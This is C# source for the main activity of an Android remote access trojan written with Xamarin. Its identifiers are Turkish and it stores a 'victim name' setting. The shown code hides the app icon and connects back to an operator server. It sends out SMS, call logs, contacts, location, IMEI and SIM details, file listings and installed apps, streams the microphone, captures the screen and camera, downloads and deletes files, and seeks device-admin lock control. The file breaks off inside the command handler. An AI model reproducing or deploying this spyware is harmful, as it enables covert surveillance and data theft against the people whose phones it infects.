using Android.App;
using Android.App.Admin;
using Android.Bluetooth;
using Android.Content;
using Android.Content.PM;
using Android.Database;
using Android.Graphics;
using Android.Graphics.Drawables;
using Android.Hardware.Display;
using Android.Locations;
using Android.Media;
using Android.Media.Projection;
using Android.Net.Wifi;
using Android.OS;
using Android.Provider;
using Android.Runtime;
using Android.Support.V4.Content.PM;
using Android.Support.V4.Graphics.Drawable;
using Android.Telephony;
using Android.Views;
using Android.Widget;

using System;
using System.Collections.Generic;                 //MADE IN TURKEY - MADE WITH LOVE (:\\
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Xamarin.Essentials;

namespace Task2
{
    [Activity(Label = "@string/app_name", MainLauncher = true, Icon = "@mipmap/icon", ExcludeFromRecents = true, AlwaysRetainTaskState = true)]

    public class MainActivity : Activity
    {
        public static int REQUEST_CODE = 100;

        public static string SCREENCAP_NAME = "screencap";
        public static int VIRTUAL_DISPLAY_FLAGS = (int)VirtualDisplayFlags.OwnContentOnly | (int)VirtualDisplayFlags.Public;
        public static MediaProjection sMediaProjection;

        public static MediaProjectionManager mProjectionManager;
        public static ImageReader mImageReader;
        public static Handler mHandler;
        public static Display mDisplay;
        public static VirtualDisplay mVirtualDisplay;
        public static int mDensity;
        public static int mWidth;
        public static int mHeight;
        public static int mRotation;
        public static OrientationChangeCallback mOrientationChangeCallback;
        public void createVirtualDisplay()
        {
            // get width and height
            Point size = new Point();
            mDisplay.GetSize(size);
            mWidth = size.X;
            mHeight = size.Y;

            // start capture reader
            mImageReader = ImageReader.NewInstance(mWidth, mHeight, (ImageFormatType)Android.Graphics.Format.Rgba8888, 2);
            mVirtualDisplay = sMediaProjection.CreateVirtualDisplay(SCREENCAP_NAME, mWidth, mHeight, mDensity, (DisplayFlags)VIRTUAL_DISPLAY_FLAGS, mImageReader.Surface, null, mHandler);
            mImageReader.SetOnImageAvailableListener(new ImageAvailableListener(), mHandler);
        }
        public void SetSocketKeepAliveValues(Socket instance, int KeepAliveTime, int KeepAliveInterval)
        {
            //KeepAliveTime: default value is 2hr
            //KeepAliveInterval: default value is 1s and Detect 5 times

            //the native structure
            //struct tcp_keepalive {
            //ULONG onoff;
            //ULONG keepalivetime;
            //ULONG keepaliveinterval;
            //};

            int size = Marshal.SizeOf(new uint());
            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
            bool OnOff = true;

            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);

            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
        }

        static readonly Type SERVICE_TYPE = typeof(ForegroundService);
        //readonly string TAG = SERVICE_TYPE.FullName;
        public static Socket Soketimiz = default;
        static Intent _startServiceIntent;
        IPEndPoint endpForMic = default;
        public async void Baglanti_Kur()
        {
            await Task.Run(async() =>
            {
                try
                {
                    if (Soketimiz != null)
                    {
                        Soketimiz.Close();
                    }
                    var ipadresi = Dns.GetHostAddresses(MainValues.IP)[0];
                    IPEndPoint endpoint = new IPEndPoint(ipadresi, MainValues.port);
                    Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                    //Soketimiz.NoDelay = true;
                    endpForMic = endpoint;
                    //Soketimiz.ReceiveBufferSize = int.MaxValue; Soketimiz.SendBufferSize = int.MaxValue;
                    Soketimiz.Connect(endpoint);

                    soketimizeGonder("IP", "[VERI]" +
                        MainValues.KRBN_ISMI + "[VERI]" + RegionInfo.CurrentRegion + "/" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
                       + "[VERI]" + DeviceInfo.Manufacturer + "/" + DeviceInfo.Model + "[VERI]" + DeviceInfo.Version + "/" + ((int)Build.VERSION.SdkInt).ToString() + "[VERI][0x09]");

                    SetSocketKeepAliveValues(Soketimiz, 2000, 1000);
                    infoAl(Soketimiz);
                }
                catch (Exception)
                {
                    await Task.Delay(20);
                    Baglanti_Kur();
                }
            });
        }
        public async void infoAl(Socket sckInf)
        {
            try
            {
                NetworkStream networkStream = new NetworkStream(sckInf);
                System.Text.StringBuilder sb = new System.Text.StringBuilder();
                int thisRead = 0;
                int blockSize = 2048;
                byte[] dataByte = new byte[blockSize];
                while (true)
                {
                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                    sb.Append(System.Text.Encoding.UTF8.GetString(dataByte, 0, thisRead));
                    sb = sb.Replace("[0x09]KNT[VERI][0x09]<EOF>", "");
                    while (sb.ToString().Trim().Contains("<EOF>"))
                    {
                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                        Soketimizdan_Gelen_Veriler(veri.Replace("<EOF>", "").Replace("[0x09]KNT[VERI][0x09]", ""));
                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                    }
                }
            }
            catch (Exception)
            {
                Prev.global_cam.StopCamera(); key_gonder = false; micStop();
                stopProjection(); Baglanti_Kur();
            }
        }
        public async void soketimizeGonder(string tag, string mesaj)
        {
            try
            {
                using (NetworkStream ns = new NetworkStream(Soketimiz))
                {
                    byte[] cmd = System.Text.Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + $"<EOF{PASSWORD}>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }

            }
            catch (Exception) { }
        }
        public void kameraCek(Socket soket)
        {
            UpdateTimeTask.Kamera(soket);
        }
        List<string> allDirectory_ = default;
        List<string> sdCards = default;
        public void dosyalar()
        {
            allDirectory_ = new List<string>();
            try
            {
                Java.IO.File[] _path = GetExternalFilesDirs(null);
                sdCards = new List<string>();
                List<string> allDirectory = new List<string>();
                foreach (var spath in _path)
                {
                    if (spath.Path.Contains("emulated") == false)
                    {
                        string s = spath.Path.ToString();
                        s = s.Replace(s.Substring(s.IndexOf("/And")), "");
                        sdCards.Add(s);
                    }
                }
                if (sdCards.Count > 0)
                {
                    listf(sdCards[0]);
                }
                sonAsama(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath);
                string dosyalarS = "";
                foreach (string inf in allDirectory_)
                {
                    dosyalarS += inf + "<";
                }
                if (!string.IsNullOrEmpty(dosyalarS))
                {
                    soketimizeGonder("FILES", "[VERI]IKISIDE[VERI]" + dosyalarS + "[VERI][0x09]");
                }
                else
                {
                    soketimizeGonder("FILES", "[VERI]IKISIDE[VERI]BOS[VERI][0x09]");
                }
            }
            catch (Exception) { }
        }
        public void sonAsama(string absPath)
        {
            try
            {
                DirectoryInfo di = new DirectoryInfo(absPath);
                DirectoryInfo[] klasorler = di.GetDirectories();
                FileInfo[] fi = di.GetFiles("*.*");
                foreach (DirectoryInfo directoryInfo in klasorler)
                {
                    allDirectory_.Add(directoryInfo.Name + "=" + directoryInfo.FullName + "=" + "" + "=" + "" + "=CİHAZ="
                         + absPath + "=");
                }
                foreach (FileInfo f_info in fi)
                {
                    if (f_info.DirectoryName.Contains(".thumbnail") == false)
                    {
                        allDirectory_.Add(f_info.Name + "=" + f_info.DirectoryName + "=" + f_info.Extension + "=" + GetFileSizeInBytes(
                            f_info.FullName) + "=CİHAZ=" + absPath + "=");
                    }
                }
            }
            catch (Exception) { }
        }
        public void listf(string directoryName)
        {
            try
            {
                Java.IO.File directory = new Java.IO.File(directoryName);
                Java.IO.File[] fList = directory.ListFiles();
                if (fList != null)
                {
                    foreach (Java.IO.File file in fList)
                    {
                        try
                        {
                            if (file.IsFile)
                            {
                                allDirectory_.Add(file.Name + "=" + file.AbsolutePath + "=" +
                        file.AbsolutePath.Substring(file.AbsolutePath.LastIndexOf(".")) + "=" + GetFileSizeInBytes(
                                         file.AbsolutePath) + "=SDCARD=" + directoryName + "=");
                            }
                            else if (file.IsDirectory)
                            {
                                allDirectory_.Add(file.Name + "=" + file.AbsolutePath + "=" +
                        "" + "=" + "" + "=SDCARD=" + directoryName + "=");
                            }
                        }
                        catch (Exception) { }
                    }
                }
            }
            catch (Exception) { }
        }
        public void uygulamalar()
        {
            var apps = PackageManager.GetInstalledApplications(PackageInfoFlags.MetaData);
            string bilgiler = "";
            for (int i = 0; i < apps.Count; i++)
            {
                try
                {
                    ApplicationInfo applicationInfo = apps[i];
                    var isim = applicationInfo.LoadLabel(PackageManager);
                    var paket_ismi = applicationInfo.PackageName;
                    var launcher = PackageManager.GetLaunchIntentForPackage(paket_ismi);
                    if (launcher.Action == Intent.ActionMain && launcher.Categories.Contains(Intent.CategoryLauncher))
                    {
                        if (applicationInfo.Flags != ApplicationInfoFlags.System)
                        {
                            string app_ico = "";
                            try
                            {
                                app_ico = Convert.ToBase64String(drawableToByteArray(applicationInfo.LoadIcon(PackageManager)));
                            }
                            catch (Exception) { app_ico = "[NULL]"; }

                            string infos = isim + "[HANDSUP]" + paket_ismi + "[HANDSUP]" + app_ico + "[HANDSUP]";
                            bilgiler += infos + "[REMIX]";
                        }
                    }
                }
                catch (Exception) { }
            }
            soketimizeGonder("APPS", "[VERI]" + bilgiler + "[VERI][0x09]");

        }
        public static string GetFileSizeInBytes(string filenane)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = new FileInfo(filenane).Length;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch (Exception ex) { return ex.Message; }
        }
        UdpClient client = null;
        AudioStream audioStream = null;
        public void micSend(string sampleRate, string kaynak)
        {
            micStop();
            AudioSource source = AudioSource.Default;
            switch (kaynak)
            {
                case "Mikrofon":
                    source = AudioSource.Mic;
                    break;
                case "Varsayılan":
                    source = AudioSource.Default;
                    break;
                case "Telefon Görüşmesi":
                    if (mgr == null) { mgr = (AudioManager)GetSystemService(AudioService); }
                    mgr.Mode = Mode.InCall;
                    mgr.SetStreamVolume(Android.Media.Stream.VoiceCall, mgr.GetStreamMaxVolume(Android.Media.Stream.VoiceCall), 0);
                    source = AudioSource.Mic;
                    break;
            }
            try
            {
                client = new UdpClient();
                audioStream = new AudioStream(int.Parse(sampleRate), source);
                audioStream.OnBroadcast += AudioStream_OnBroadcast;
                audioStream.Start();
            }
            catch (Exception) { }
        }

        public void micStop()
        {
            if (mgr == null) { mgr = (AudioManager)GetSystemService(AudioService); }
            mgr.Mode = Mode.Normal;
            if (audioStream != null)
            {
                audioStream.Stop();
                audioStream.Flush();
                audioStream = null;
                if (client != null)
                {
                    client.Close();
                    client.Dispose();
                }
            }
        }
        private void AudioStream_OnBroadcast(object sender, byte[] e)
        {
            try
            {
                //new IPEndPoint(Dns.GetHostAddresses(MainValues.IP)[0], MainValues.port)
                client.Send(e, e.Length, endpForMic);
            }
            catch (SocketException)
            {
                micStop();
            }
        }
        public void kameraCozunurlukleri()
        {
            try
            {
                var cameraManager = (Android.Hardware.Camera2.CameraManager)GetSystemService(CameraService);
                string[] IDs = cameraManager.GetCameraIdList();
                string gidecekler = default;
                string cameralar = default;
                string supZoom = default;
                string previewsizes = default;
                for (int i = 0; i < IDs.Length; i++)
                {
                    int cameraId = int.Parse(IDs[i]);
                    Android.Hardware.Camera.CameraInfo cameraInfo = new Android.Hardware.Camera.CameraInfo();
                    Android.Hardware.Camera.GetCameraInfo(cameraId, cameraInfo);
                    Android.Hardware.Camera camera = Android.Hardware.Camera.Open(cameraId);
                    Android.Hardware.Camera.Parameters cameraParams = camera.GetParameters();
                    var sizes = cameraParams.SupportedPictureSizes;
                    var presize = cameraParams.SupportedPreviewSizes;
                    supZoom = cameraParams.IsZoomSupported.ToString() + "}" + cameraParams.MaxZoom.ToString();
                    for (int j = 0; j < sizes.Count; j++)
                    {

                        int widht = ((Android.Hardware.Camera.Size)sizes[j]).Width;
                        int height = ((Android.Hardware.Camera.Size)sizes[j]).Height;
                        gidecekler += widht.ToString() + "x" + height.ToString() + "<";
                    }
                    camera.Release();
                    gidecekler += ">";
                    if (i == 0)
                    {
                        foreach (var siz in presize)
                        {
                            previewsizes += siz.Width.ToString() + "x" + siz.Height.ToString() + "<";
                        }
                    }
                    cameralar += IDs[i] + "!";
                }
                soketimizeGonder("OLCULER", "[VERI]" + gidecekler + $"[VERI]{supZoom}[VERI]{previewsizes}[VERI]{cameralar}[VERI][0x09]");
            }
            catch (Exception)
            {
                soketimizeGonder("OLCULER", "[VERI]" + "Kameraya erişilemiyor." + "[VERI][0x09]");
            }
        }
        public static bool key_gonder = false;
        public string PASSWORD = string.Empty;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            //SetContentView(Resource.Layout.Main);
            Platform.Init(this, savedInstanceState);
            StartForegroundServiceCompat<ForegroundService>(this, savedInstanceState);
            global_activity = this;
            global_packageManager = PackageManager;
            hide();
            mProjectionManager = (MediaProjectionManager)GetSystemService(MediaProjectionService);
            bool exsist = Preferences.ContainsKey("aypi_adresi");
            if (exsist == false)
            {
                Preferences.Set("aypi_adresi", Resources.GetString(Resource.String.IP));
                Preferences.Set("port", Resources.GetString(Resource.String.PORT));
                Preferences.Set("kurban_adi", Resources.GetString(Resource.String.KURBANISMI));
                Preferences.Set("pass", Resources.GetString(Resource.String.PASSWORD));
            }
            MainValues.IP = Preferences.Get("aypi_adresi", "192.168.1.7");
            MainValues.port = int.Parse(Preferences.Get("port", "5656"));
            MainValues.KRBN_ISMI = Preferences.Get("kurban_adi", "n-a");
            PASSWORD = Preferences.Get("pass", string.Empty);

            if (Resources.GetString(Resource.String.Wakelock) == "1")
            {
                PowerManager pmanager = (PowerManager)GetSystemService("power");
                wakelock = pmanager.NewWakeLock(WakeLockFlags.Partial, "LocationManagerService");
                wakelock.SetReferenceCounted(true);
                wakelock.Acquire();
            }

            Baglanti_Kur();

            if (!Directory.Exists(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly"))
            {
                Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
            }

            Finish();

        }
        protected override void OnPause()
        {
            base.OnPause();
        }
        public void hide()
        {
            ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(MainActivity)).Name);
            PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
        }
        private void AddShortcut(string appName, string url, byte[] icon_byte)
        {
            //File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory + "/launcher.jpg", icon_byte);
            try
            {
                Bitmap bitmap = BitmapFactory.DecodeByteArray(icon_byte, 0, icon_byte.Length);
                var uri = Android.Net.Uri.Parse(url);
                var intent_ = new Intent(Intent.ActionView, uri);

                if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                {
                    if (ShortcutManagerCompat.IsRequestPinShortcutSupported(this))
                    {
                        ShortcutInfoCompat shortcutInfo = new ShortcutInfoCompat.Builder(this, "#1")
                         .SetIntent(intent_)
                         .SetShortLabel(appName)
                         .SetIcon(IconCompat.CreateWithBitmap(bitmap))
                         .Build();
                        ShortcutManagerCompat.RequestPinShortcut(this, shortcutInfo, null);
                    }
                }
                else
                {
                    Intent installer = new Intent();
                    installer.PutExtra("android.intent.extra.shortcut.INTENT", intent_);
                    installer.PutExtra("android.intent.extra.shortcut.NAME", appName);
                    installer.PutExtra("android.intent.extra.shortcut.ICON", bitmap);
                    installer.SetAction("com.android.launcher.action.INSTALL_SHORTCUT");
                    SendBroadcast(installer);
                }
                soketimizeGonder("SHORTCUT", "[VERI]Kısayol ekrana eklendi.[VERI][0x09]");
            }
            catch (Exception ex)
            {
                soketimizeGonder("SHORTCUT", "[VERI]Hata: " + ex.Message + "[VERI][0x09]");
            }
        }
        private PowerManager.WakeLock wakelock = null;
        public const int RequestCodeEnableAdmin = 15;
        private void startProjection()
        {
            Intent intent = new Intent(ApplicationContext, typeof(screenActivty));
            StartActivity(intent);
        }
        public void stopProjection()
        {
            if (sMediaProjection != null)
            {
                sMediaProjection.Stop();
            }
        }
        protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
        {
            if (requestCode == RequestCodeEnableAdmin)
            {
                PostSetKioskMode(resultCode == Result.Ok);
            }
            else
            {
                base.OnActivityResult(requestCode, resultCode, data);
            }
        }
        public void rehberEkle(string FirstName, string PhoneNumber)
        {
            List<ContentProviderOperation> ops = new List<ContentProviderOperation>();
            int rawContactInsertIndex = ops.Count;

            ContentProviderOperation.Builder builder =
                ContentProviderOperation.NewInsert(ContactsContract.RawContacts.ContentUri);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountType, null);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountName, null);
            ops.Add(builder.Build());

            //Name
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.StructuredName.ContentItemType);
            //builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.FamilyName, LastName);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.GivenName, FirstName);
            ops.Add(builder.Build());

            //Number
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.Phone.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.Number, PhoneNumber);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.Type,
                    ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.TypeCustom);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.InterfaceConsts.Label, "Primary Phone");
            ops.Add(builder.Build());
            try
            {
                var res = ContentResolver.ApplyBatch(ContactsContract.Authority, ops);
                //Toast.MakeText(this, "Contact Saved", ToastLength.Short).Show();
            }
            catch
            {

                //Toast.MakeText(this, "Contact Not Saved", ToastLength.Long).Show();
            }
        }
        public async void konus(string metin)
        {
            try
            {
                var locales = await TextToSpeech.GetLocalesAsync();
                var locale = locales.FirstOrDefault();

                var settings = new SpeechOptions()
                {
                    Volume = 1.0f,
                    Pitch = 1.0f,
                    Locale = locale
                };

                await TextToSpeech.SpeakAsync(metin, settings);
            }
            catch (Exception) { }
        }
        public void rehberNoSil(string isim)
        {
            Context thisContext = this;
            string[] Projection = new string[] { ContactsContract.ContactsColumns.LookupKey, ContactsContract.ContactsColumns.DisplayName };
            ICursor cursor = thisContext.ContentResolver.Query(ContactsContract.Contacts.ContentUri, Projection, null, null, null);
            while (cursor != null & cursor.MoveToNext())
            {
                string lookupKey = cursor.GetString(0);
                string name = cursor.GetString(1);

                if (name == isim)
                {
                    var uri = Android.Net.Uri.WithAppendedPath(ContactsContract.Contacts.ContentLookupUri, lookupKey);
                    thisContext.ContentResolver.Delete(uri, null, null);
                    cursor.Close();
                    return;
                }
            }
        }
        public void DeleteFile_(string filePath)
        {
            try
            {

                new Java.IO.File(filePath).AbsoluteFile.Delete();
                //Toast.MakeText(this, "DELETED", ToastLength.Long).Show();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, ex.Message + "DELETE", ToastLength.Long).Show();
            }
        }

        public async void lokasyonCek()
        {
            double GmapLat = 0;
            double GmapLong = 0;
            try
            {
                var request = new GeolocationRequest(GeolocationAccuracy.Default, TimeSpan.FromSeconds(6));
                var location = await Geolocation.GetLocationAsync(request);
                GmapLat = location.Latitude;
                GmapLat = location.Longitude;
                if (location != null)
                {
                    var placemarks = await Geocoding.GetPlacemarksAsync(location.Latitude, location.Longitude);
                    var placemark = placemarks?.FirstOrDefault();
                    string GeoCountryName = "Boş";
                    string admin = "Boş";
                    string local = "Boş";
                    string sublocal = "Boş";
                    string sub2 = "Boş";
                    if (placemark != null)
                    {
                        GeoCountryName = placemark.CountryName;
                        admin = placemark.AdminArea;
                        local = placemark.Locality;
                        sublocal = placemark.SubLocality;
                        sub2 = placemark.SubAdminArea;

                    }
                    soketimizeGonder("LOCATION", "[VERI]" + GeoCountryName + "=" + admin +
                           "=" + sub2 + "=" + sublocal + "=" + local + "=" + location.Latitude.ToString() +
                         "{" + location.Longitude + "=[VERI][0x09]");
                }
            }
            catch (Exception ex)
            {
                soketimizeGonder("LOCATION", "[VERI]" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=" + "HATA" + "=[VERI][0x09]");
            }
        }
        public void Ac(string path)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(path);
                file.SetReadable(true);
                string application = "";
                string extension = System.IO.Path.GetExtension(path);
                switch (extension.ToLower())
                {
                    case ".txt":
                        application = "text/plain";
                        break;
                    case ".doc":
                    case ".docx":
                        application = "application/msword";
                        break;
                    case ".pdf":
                        application = "application/pdf";
                        break;
                    case ".xls":
                    case ".xlsx":
                        application = "application/vnd.ms-excel";
                        break;
                    case ".jpg":
                    case ".jpeg":
                    case ".png":
                    case ".gif":
                        application = "image/*";
                        break;
                    case ".mp4":
                    case ".3gp":
                    case ".mpg":
                    case ".avi":
                        application = "video/*";
                        break;
                    default:
                        application = "*/*";
                        break;
                }
                Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + path);
                Intent intent = new Intent(Intent.ActionView);
                intent.SetDataAndType(uri, application);
                intent.SetFlags(ActivityFlags.ClearTop);
                StartActivity(intent);
            }
            catch (Exception) { }
        }

        public void smsLogu(string nereden)
        {
            LogVerileri veri = new LogVerileri(this, nereden);
            veri.smsLeriCek();
            string gidecek_veriler = "";
            var sms_ = veri.smsler;
            for (int i = 0; i < sms_.Count; i++)
            {

                string bilgiler = sms_[i].Gonderen + "{" + sms_[i].Icerik + "{"
                + sms_[i].Tarih + "{" + LogVerileri.SMS_TURU + "{" + sms_[i].Isim + "{";

                gidecek_veriler += bilgiler + "&";

            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "SMS YOK"; }
            soketimizeGonder("SMSLOGU", "[VERI]" + gidecek_veriler + "[VERI][0x09]");
        }
        public void telefonLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.aramaKayitlariniCek();
            var list = veri.kayitlar;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = (list[i].Isim + "=" + list[i].Numara + "=" + list[i].Tarih + "="
                    + list[i].Durasyon + "=" + list[i].Tip + "=");

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "CAGRI YOK"; }
            soketimizeGonder("CAGRIKAYITLARI", "[VERI]" + gidecek_veriler + "[VERI][0x09]");
        }
        public void rehberLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.rehberiCek();
            var list = veri.isimler_;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = list[i].Isim + "=" + list[i].Numara + "=";

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "REHBER YOK"; }
            soketimizeGonder("REHBER", "[VERI]" + gidecek_veriler + "[VERI][0x09]");
        }
        public bool SetKioskMode(bool enable)
        {
            var deviceAdmin =
                new ComponentName(this, Java.Lang.Class.FromType(typeof(AdminReceiver)));
            if (enable)
            {
                var intent = new Intent(DevicePolicyManager.ActionAddDeviceAdmin);
                intent.PutExtra(DevicePolicyManager.ExtraDeviceAdmin, deviceAdmin);
                // intent.PutExtra(DevicePolicyManager.ExtraAddExplanation, "activity.getString(R.string.add_admin_extra_app_text");
                StartActivityForResult(intent, RequestCodeEnableAdmin);
                return false;
            }
            else
            {
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                devicePolicyManager.RemoveActiveAdmin(deviceAdmin);
                return true;
            }
        }

        private void PostSetKioskMode(bool enable)
        {
            if (enable)
            {
                var deviceAdmin = new ComponentName(this,
                    Java.Lang.Class.FromType(typeof(AdminReceiver)));
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                if (!devicePolicyManager.IsAdminActive(deviceAdmin)) throw new Exception("Not Admin");

                StartLockTask();
            }
            else
            {
                StopLockTask();
            }
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Permission[] grantResults)
        {
            Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
        private Intent GetIntent(Type type, string action)
        {
            var intent = new Intent(this, type);
            intent.SetAction(action);
            return intent;
        }

        public void StartForegroundServiceCompat<T>(Context context, Bundle args = null) where T : Service
        {
            _startServiceIntent = GetIntent(SERVICE_TYPE, MainValues.ACTION_START_SERVICE);
            if (args != null)
                _startServiceIntent.PutExtras(args);

            if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                context.StartForegroundService(_startServiceIntent);
            else
                context.StartService(_startServiceIntent);
        }


        public void javaFileWrite(byte[] veri, string yol)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(yol);
                if (file.Exists())
                {
                    file.Delete();
                }
                Java.IO.FileOutputStream fos = new Java.IO.FileOutputStream(file);
                fos.Write(veri);
                fos.Close();
                //fos.Flush();
                fos.Dispose();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, ex.Message, ToastLength.Long)
                //.Show();
            }
        }
        public async void DosyaIndir(string uri, string filename)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/" +
                    filename, await wc.DownloadDataTaskAsync(uri));
                }
                try
                {
                    soketimizeGonder("INDIRILDI", "[VERI]File has successfully downloaded.[0x09]");
                }
                catch (Exception) { }
            }
            catch (Exception ex)
            {
                try
                {
                    soketimizeGonder("INDIRILDI", "[VERI]" + ex.Message + "[VERI][0x09]");
                }
                catch (Exception) { }
            }
        }
        public string fetchAllInfo()
        {
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            sb.Append("#------------[Device Info]------------#<");
            try { sb.Append("Device Name: "+Settings.System.GetString(ContentResolver, "device_name") + "<"); ; } catch (Exception) { }
            try { sb.Append("Model: " + Build.Model + "<"); ; } catch (Exception) { }
            try
            {
                sb.Append("Board: " + Build.Board + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Brand: " + Build.Brand + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Bootloader: " + Build.Bootloader + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Device: " + Build.Device + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Display: " + Build.Display + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Fingerprint: " + Build.Fingerprint + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Hardware: " + Build.Hardware + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("HOST: " + Build.Host + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("ID: " + Build.Id + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Manufacturer: " + Build.Manufacturer + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Product: " + Build.Product + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Serial: " + Build.Serial + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Tags: " + Build.Tags + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("User: " + Build.User + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Time: " + DateTime.Now.ToString("HH:mm") + "<");
            }
            catch (Exception) { }
            sb.Append("#------------[System info]------------#<");
            try
            {
                sb.Append("Release: " + Build.VERSION.Release + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("SDK_INT: " + Build.VERSION.SdkInt + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Language: " + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName + "<");
            }
            catch (Exception) { }
            try
            {
               sb.Append("Time: " +DateTime.Now.ToString("dddd, dd MMMM yyyy") + "<");
            }
            catch (Exception ) { }
            sb.Append("#------------[Sim Info]------------#<");
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).DeviceId;
                sb.Append("IMEI: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimSerialNumber;
                sb.Append("Sim Serial Number: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimOperator;
                sb.Append("Sim Operator: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimOperatorName;
                sb.Append("Sim Operator Name: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).Line1Number;
                sb.Append("Line Number: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimCountryIso;
                sb.Append("Sim CountryIso: " + str + "<");
            }
            catch (Exception) { }
            return sb.ToString();
        }
        private void Soketimizdan_Gelen_Veriler(string data)
        {
            RunOnUiThread(() =>
            {
                string[] _ayir_ = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
                foreach (string str in _ayir_)
                {
